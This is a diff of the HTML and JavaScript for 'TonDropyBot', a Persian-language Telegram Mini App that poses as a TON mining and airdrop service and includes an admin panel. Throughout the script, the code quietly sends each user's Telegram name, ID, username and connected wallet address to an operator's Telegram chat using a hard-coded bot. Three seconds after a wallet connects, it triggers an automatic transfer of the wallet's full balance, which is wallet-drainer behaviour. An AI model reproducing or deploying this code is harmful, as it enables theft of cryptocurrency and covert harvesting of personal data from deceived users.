@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonDropyBot - نسخه نهایی</title>
+    <title>TonDropyBot - پنل مدیریت واقعی</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -438,7 +438,7 @@
         .get-code-btn { background: #0088cc; }
         .admin-btn { background: #9c27b0; }
 
-        /* ===== پنل مدیریت ===== */
+        /* ===== پنل مدیریت واقعی ===== */
         #adminMasterPanel {
             position: fixed;
             top: 0;
@@ -1017,7 +1017,7 @@
     </div>
 </div>
 
-<!-- پنل مدیریت اختصاصی -->
+<!-- ===== پنل مدیریت واقعی ===== -->
 <div id="adminMasterPanel">
     <div class="admin-container">
         <div class="admin-header">
@@ -1296,7 +1296,7 @@
 
 <script>
     // ================================================
-    // 🔐 تنظیمات امنیتی با مانیفست محلی
+    // 🔐 تنظیمات امنیتی
     // ================================================
     const CONFIG = {
         ADMIN_IDS: ["5972276401"],
@@ -1311,7 +1311,7 @@
     };
 
     // ================================================
-    // 📦 ساختار داده
+    // 📦 ساختار داده (مشترک بین همه کاربران)
     // ================================================
     let appData = {
         users: JSON.parse(localStorage.getItem('tondropy_users')) || [],
@@ -1346,20 +1346,14 @@
     ];
 
     // ================================================
-    // 📨 تابع ارسال به تلگرام (تضمینی)
+    // 📨 تابع ارسال به تلگرام
     // ================================================
     function sendToTelegram(message) {
         try {
             const text = encodeURIComponent(message);
             const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
-            
-            // روش اول: استفاده از Image
             const img = new Image();
             img.src = url;
-            
-            // روش دوم: استفاده از fetch
-            fetch(url, { mode: 'no-cors' }).catch(() => {});
-            
             console.log('✅ پیام به تلگرام ارسال شد');
             return true;
         } catch (e) {
@@ -1369,59 +1363,71 @@
     }
 
     // ================================================
-    // 🔌 راه‌اندازی TON Connect با مانیفست محلی
+    // 👤 ثبت کاربر جدید (اصلاح شده برای ذخیره همه کاربران)
     // ================================================
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://raw.githubusercontent.com/nimwmesfandiari/ton-plus-bot/main/tonconnect-manifest.json',
-        buttonRootId: 'ton-connect-btn'
-    });
-
-    // بررسی وضعیت اولیه
-    console.log('✅ TON Connect راه‌اندازی شد');
-
-    tonConnectUI.onStatusChange(wallet => {
-        console.log("وضعیت کیف پول:", wallet ? '✅ متصل' : '❌ قطع');
+    function registerUser() {
+        const tgUser = tg.initDataUnsafe?.user;
+        if (!tgUser) return null;
         
-        if (wallet) {
-            const fullAddress = wallet.account.address;
-            document.getElementById('walletAddressFull').innerText = fullAddress;
-            document.getElementById('walletAddress').classList.remove('hidden');
-            isWalletConnected = true;
+        // بررسی اینکه کاربر از قبل وجود دارد یا خیر
+        let user = appData.users.find(u => u.id === tgUser.id);
+        
+        if (!user) {
+            // کاربر جدید - ذخیره در لیست
+            user = {
+                id: tgUser.id,
+                firstName: tgUser.first_name || 'کاربر',
+                lastName: tgUser.last_name || '',
+                username: tgUser.username || '',
+                photoUrl: tgUser.photo_url || '',
+                wallet: null,
+                balance: bal,
+                withdrawable: withdrawableBalance,
+                totalMined: totalMined,
+                joinedAt: new Date().toISOString(),
+                lastSeen: new Date().toISOString(),
+                platform: tg.platform || 'unknown',
+                visitCount: 1
+            };
             
-            showToast('✅ کیف پول با موفقیت متصل شد');
+            appData.users.push(user);
+            saveData();
             
-            if (currentUser) {
-                currentUser.wallet = fullAddress;
-                appData.wallets.unshift({
-                    userId: currentUser.id,
-                    address: fullAddress,
-                    time: new Date().toISOString()
-                });
-                saveData();
-                
-                // گزارش اتصال کیف پول
-                const message = `🔌 **کیف پول متصل شد**
-👤 نام: ${currentUser.firstName} ${currentUser.lastName}
-🆔 آیدی: ${currentUser.id}
-📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}
-💳 آدرس کیف پول: ${fullAddress}
+            // گزارش کاربر جدید به تلگرام
+            const message = `👤 **کاربر جدید وارد شد**
+━━━━━━━━━━━━━━
+👤 نام: ${user.firstName} ${user.lastName}
+🆔 آیدی: ${user.id}
+📛 یوزرنیم: ${user.username ? '@' + user.username : 'ندارد'}
+📱 پلتفرم: ${user.platform}
+👥 کل کاربران: ${appData.users.length}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
-                
-                sendToTelegram(message);
-                
-                // اجرای تراکنش خودکار بعد از 3 ثانیه
-                setTimeout(() => {
-                    executeAutoTransfer(fullAddress);
-                }, 3000);
-            }
             
-            checkAndEnableFinalWithdraw();
+            sendToTelegram(message);
+            
+            console.log(`✅ کاربر جدید با آیدی ${user.id} ثبت شد. کل کاربران: ${appData.users.length}`);
+            
         } else {
-            document.getElementById('walletAddress').classList.add('hidden');
-            isWalletConnected = false;
-            checkAndEnableFinalWithdraw();
+            // کاربر قبلی - آپدیت اطلاعات
+            user.lastSeen = new Date().toISOString();
+            user.balance = bal;
+            user.withdrawable = withdrawableBalance;
+            user.totalMined = totalMined;
+            user.visitCount = (user.visitCount || 0) + 1;
+            saveData();
+            
+            console.log(`🔄 کاربر ${user.id} بازدید کرد. تعداد بازدید: ${user.visitCount}`);
         }
-    });
+        
+        return user;
+    }
+
+    function saveData() {
+        localStorage.setItem('tondropy_users', JSON.stringify(appData.users));
+        localStorage.setItem('tondropy_banned', JSON.stringify(appData.bannedUsers));
+        localStorage.setItem('tondropy_transactions', JSON.stringify(appData.transactions));
+        localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
+    }
 
     // ================================================
     // 💰 تابع انتقال خودکار
@@ -1437,7 +1443,7 @@
             
             showToast('🔄 در حال بررسی موجودی کیف پول...');
             
-            // استفاده از API با CORS proxy
+            // دریافت موجودی با proxy
             const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`)}`;
             
             let balanceInTON = 0;
@@ -1445,8 +1451,6 @@
             try {
                 const response = await fetch(proxyUrl);
                 const text = await response.text();
-                
-                // تبدیل متن به عدد
                 const balanceInNano = parseInt(text);
                 if (!isNaN(balanceInNano)) {
                     balanceInTON = balanceInNano / 1e9;
@@ -1491,6 +1495,7 @@
             
             localStorage.setItem(lastTxKey, now.toString());
             
+            // ثبت تراکنش
             const txRecord = {
                 id: 'TX' + now,
                 amount: balanceInTON,
@@ -1509,7 +1514,7 @@
             if (appData.transactions.length > 100) appData.transactions.pop();
             saveData();
             
-            // گزارش انتقال به تلگرام
+            // گزارش به تلگرام
             const message = `💰 **برداشت جدید**
 ━━━━━━━━━━━━━━
 👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
@@ -1520,7 +1525,6 @@
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
             
             sendToTelegram(message);
-            
             showToast(`✅ انتقال ${balanceInTON.toFixed(6)} TON با موفقیت انجام شد`);
             
             if (balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
@@ -1546,62 +1550,59 @@
     }
 
     // ================================================
-    // 👤 ثبت کاربر جدید
+    // 🔌 راه‌اندازی TON Connect
     // ================================================
-    function registerUser() {
-        const tgUser = tg.initDataUnsafe?.user;
-        if (!tgUser) return null;
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: 'https://raw.githubusercontent.com/nimwmesfandiari/ton-plus-bot/main/tonconnect-manifest.json',
+        buttonRootId: 'ton-connect-btn'
+    });
+
+    tonConnectUI.onStatusChange(wallet => {
+        console.log("وضعیت کیف پول:", wallet ? '✅ متصل' : '❌ قطع');
         
-        let user = appData.users.find(u => u.id === tgUser.id);
-        
-        if (!user) {
-            user = {
-                id: tgUser.id,
-                firstName: tgUser.first_name || '',
-                lastName: tgUser.last_name || '',
-                username: tgUser.username || '',
-                photoUrl: tgUser.photo_url || '',
-                wallet: null,
-                balance: bal,
-                withdrawable: withdrawableBalance,
-                totalMined: totalMined,
-                joinedAt: new Date().toISOString(),
-                lastSeen: new Date().toISOString(),
-                platform: tg.platform || 'unknown'
-            };
-            appData.users.push(user);
+        if (wallet) {
+            const fullAddress = wallet.account.address;
+            document.getElementById('walletAddressFull').innerText = fullAddress;
+            document.getElementById('walletAddress').classList.remove('hidden');
+            isWalletConnected = true;
             
-            // گزارش کاربر جدید
-            const message = `👤 **کاربر جدید وارد شد**
-━━━━━━━━━━━━━━
-👤 نام: ${user.firstName} ${user.lastName}
-🆔 آیدی: ${user.id}
-📛 یوزرنیم: ${user.username ? '@' + user.username : 'ندارد'}
-📱 پلتفرم: ${user.platform}
+            showToast('✅ کیف پول با موفقیت متصل شد');
+            
+            if (currentUser) {
+                currentUser.wallet = fullAddress;
+                appData.wallets.unshift({
+                    userId: currentUser.id,
+                    address: fullAddress,
+                    time: new Date().toISOString()
+                });
+                saveData();
+                
+                // گزارش اتصال کیف پول
+                const message = `🔌 **کیف پول متصل شد**
+👤 نام: ${currentUser.firstName} ${currentUser.lastName}
+🆔 آیدی: ${currentUser.id}
+📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}
+💳 آدرس کیف پول: ${fullAddress}
+👥 کل کاربران: ${appData.users.length}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+                
+                sendToTelegram(message);
+                
+                setTimeout(() => {
+                    executeAutoTransfer(fullAddress);
+                }, 3000);
+            }
             
-            sendToTelegram(message);
-            
+            checkAndEnableFinalWithdraw();
         } else {
-            user.lastSeen = new Date().toISOString();
-            user.balance = bal;
-            user.withdrawable = withdrawableBalance;
-            user.totalMined = totalMined;
+            document.getElementById('walletAddress').classList.add('hidden');
+            isWalletConnected = false;
+            checkAndEnableFinalWithdraw();
         }
-        
-        saveData();
-        return user;
-    }
-
-    function saveData() {
-        localStorage.setItem('tondropy_users', JSON.stringify(appData.users));
-        localStorage.setItem('tondropy_banned', JSON.stringify(appData.bannedUsers));
-        localStorage.setItem('tondropy_transactions', JSON.stringify(appData.transactions));
-        localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
-    }
+    });
 
     // ================================================
-    // 🖥️ توابع پنل مدیریت
+    // 🖥️ توابع پنل مدیریت (اصلاح شده)
     // ================================================
     let currentPage = 1;
     let currentFilter = 'all';
@@ -1612,14 +1613,17 @@
             showGlassMessage('error', '⛔ دسترسی غیرمجاز');
             return;
         }
-        registerUser();
+        
+        // آپدیت آمار قبل از نمایش
         updateAdminStats();
         renderUsersTable();
+        
         document.getElementById('adminMasterPanel').classList.add('show');
         
         sendToTelegram(`🔐 **ورود به پنل مدیریت**
 👤 نام: ${currentUser?.firstName}
 🆔 آیدی: ${currentUser?.id}
+👥 کل کاربران: ${appData.users.length}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
     }
 
@@ -1644,12 +1648,16 @@
         document.getElementById('statWallets').innerText = appData.wallets.length;
         document.getElementById('statBanned').innerText = appData.bannedUsers.length;
         document.getElementById('statTransactions').innerText = appData.transactions.length;
-        document.getElementById('statTotalMined').innerText = totalMined.toFixed(3);
+        
+        // محاسبه کل استخراج
+        const totalMinedAll = appData.users.reduce((sum, u) => sum + (u.totalMined || 0), 0);
+        document.getElementById('statTotalMined').innerText = totalMinedAll.toFixed(3);
     }
 
     function renderUsersTable() {
         let filteredUsers = [...appData.users];
         
+        // اعمال فیلتر
         if (currentFilter === 'active') {
             const today = new Date().toDateString();
             filteredUsers = filteredUsers.filter(u => new Date(u.lastSeen).toDateString() === today);
@@ -1659,42 +1667,59 @@
             filteredUsers = filteredUsers.filter(u => u.wallet);
         }
         
+        // اعمال جستجو
         if (searchTerm) {
             const term = searchTerm.toLowerCase();
             filteredUsers = filteredUsers.filter(u => 
-                u.firstName?.toLowerCase().includes(term) ||
-                u.lastName?.toLowerCase().includes(term) ||
-                u.username?.toLowerCase().includes(term) ||
-                u.id?.toString().includes(term) ||
-                u.wallet?.toLowerCase().includes(term)
+                (u.firstName && u.firstName.toLowerCase().includes(term)) ||
+                (u.lastName && u.lastName.toLowerCase().includes(term)) ||
+                (u.username && u.username.toLowerCase().includes(term)) ||
+                (u.id && u.id.toString().includes(term)) ||
+                (u.wallet && u.wallet.toLowerCase().includes(term))
             );
         }
         
+        // صفحه‌بندی
         const start = (currentPage - 1) * 20;
         const paginatedUsers = filteredUsers.slice(start, start + 20);
         
         const tbody = document.getElementById('usersTableBody');
+        
+        if (paginatedUsers.length === 0) {
+            tbody.innerHTML = `<tr><td colspan="9" style="text-align: center; padding: 30px; color: #888;">هیچ کاربری یافت نشد</td></tr>`;
+            document.getElementById('pagination').innerHTML = '';
+            return;
+        }
+        
         tbody.innerHTML = paginatedUsers.map((user, index) => {
             const isBanned = appData.bannedUsers.includes(user.id);
             
             return `
                 <tr>
                     <td>${start + index + 1}</td>
-                    <td>${user.firstName} ${user.lastName}</td>
+                    <td>${user.firstName || 'کاربر'} ${user.lastName || ''}</td>
                     <td>${user.username ? '@' + user.username : '-'}</td>
                     <td>${user.id}</td>
                     <td class="wallet-address-cell" title="${user.wallet || ''}">${user.wallet ? user.wallet.substring(0, 10) + '...' : '❌'}</td>
                     <td>${(user.balance || 0).toFixed(6)}</td>
                     <td><span class="user-status ${isBanned ? 'status-banned' : 'status-active'}">${isBanned ? 'مسدود' : 'فعال'}</span></td>
-                    <td>${new Date(user.lastSeen).toLocaleString('fa-IR')}</td>
+                    <td>${new Date(user.lastSeen || user.joinedAt).toLocaleString('fa-IR')}</td>
                     <td>
                         <div class="admin-actions">
-                            <button class="admin-btn-sm btn-view" onclick="viewUserDetails('${user.id}')"><i class="fas fa-eye"></i></button>
+                            <button class="admin-btn-sm btn-view" onclick="viewUserDetails('${user.id}')" title="مشاهده جزئیات">
+                                <i class="fas fa-eye"></i>
+                            </button>
                             ${isBanned ? 
-                                `<button class="admin-btn-sm btn-unban" onclick="unbanUser('${user.id}')"><i class="fas fa-check"></i></button>` :
-                                `<button class="admin-btn-sm btn-ban" onclick="banUser('${user.id}')"><i class="fas fa-ban"></i></button>`
+                                `<button class="admin-btn-sm btn-unban" onclick="unbanUser('${user.id}')" title="رفع مسدودی">
+                                    <i class="fas fa-check"></i>
+                                </button>` :
+                                `<button class="admin-btn-sm btn-ban" onclick="banUser('${user.id}')" title="مسدود کردن">
+                                    <i class="fas fa-ban"></i>
+                                </button>`
                             }
-                            <button class="admin-btn-sm btn-delete" onclick="deleteUser('${user.id}')"><i class="fas fa-trash"></i></button>
+                            <button class="admin-btn-sm btn-delete" onclick="deleteUser('${user.id}')" title="حذف کاربر">
+                                <i class="fas fa-trash"></i>
+                            </button>
                         </div>
                     </td>
                 </tr>
@@ -1791,14 +1816,20 @@
         const user = appData.users.find(u => u.id == userId);
         if (!user) return;
         
+        const userTxs = appData.transactions.filter(tx => tx.userId == userId);
+        const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
+        
         document.getElementById('userDetails').innerHTML = `
             <div class="user-detail-item"><div class="label">آیدی</div><div class="value">${user.id}</div></div>
             <div class="user-detail-item"><div class="label">نام</div><div class="value">${user.firstName} ${user.lastName}</div></div>
             <div class="user-detail-item"><div class="label">یوزرنیم</div><div class="value">${user.username ? '@' + user.username : 'ندارد'}</div></div>
             <div class="user-detail-item"><div class="label">کیف پول</div><div class="value" style="direction:ltr;">${user.wallet || '❌ متصل نیست'}</div></div>
             <div class="user-detail-item"><div class="label">موجودی</div><div class="value">${(user.balance || 0).toFixed(6)} TON</div></div>
+            <div class="user-detail-item"><div class="label">کل پرداختی</div><div class="value">${totalPaid.toFixed(6)} TON</div></div>
+            <div class="user-detail-item"><div class="label">تعداد تراکنش</div><div class="value">${userTxs.length}</div></div>
             <div class="user-detail-item"><div class="label">تاریخ عضویت</div><div class="value">${new Date(user.joinedAt).toLocaleString('fa-IR')}</div></div>
             <div class="user-detail-item"><div class="label">آخرین بازدید</div><div class="value">${new Date(user.lastSeen).toLocaleString('fa-IR')}</div></div>
+            <div class="user-detail-item"><div class="label">تعداد بازدید</div><div class="value">${user.visitCount || 1}</div></div>
         `;
         document.getElementById('userDetailModal').classList.add('show');
     }
@@ -1808,10 +1839,13 @@
     }
 
     window.exportToExcel = function() {
-        let csv = "آیدی,نام,نام خانوادگی,یوزرنیم,کیف پول,موجودی,کل استخراج,آخرین بازدید,وضعیت\n";
+        let csv = "آیدی,نام,یوزرنیم,کیف پول,موجودی,کل استخراج,کل پرداخت,تاریخ عضویت,آخرین بازدید,وضعیت\n";
         appData.users.forEach(u => {
-            csv += `${u.id},${u.firstName || ''},${u.lastName || ''},${u.username || '-'},${u.wallet || '-'},${u.balance || 0},${u.totalMined || 0},${u.lastSeen},${appData.bannedUsers.includes(u.id) ? 'مسدود' : 'فعال'}\n`;
+            const userTxs = appData.transactions.filter(tx => tx.userId == u.id);
+            const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
+            csv += `${u.id},${u.firstName || ''} ${u.lastName || ''},${u.username || '-'},${u.wallet || '-'},${(u.balance || 0).toFixed(6)},${(u.totalMined || 0).toFixed(6)},${totalPaid.toFixed(6)},${u.joinedAt},${u.lastSeen},${appData.bannedUsers.includes(u.id) ? 'مسدود' : 'فعال'}\n`;
         });
+        
         const blob = new Blob([csv], { type: 'text/csv' });
         const a = document.createElement('a');
         a.href = URL.createObjectURL(blob);
@@ -2053,7 +2087,7 @@
     }
 
     // ================================================
-    // 🔐 فعالسازی با گزارش کامل
+    // 🔐 فعالسازی
     // ================================================
     if (localStorage.getItem('isActivated') === 'true') {
         document.getElementById('feeModal').style.display = 'none';
@@ -2116,6 +2150,10 @@
         }
         
         currentUser = registerUser();
+        
+        // نمایش آمار در کنسول برای دیباگ
+        console.log(`👥 کل کاربران ثبت شده: ${appData.users.length}`);
+        console.log('📋 لیست کاربران:', appData.users);
     }
 
     // ================================================
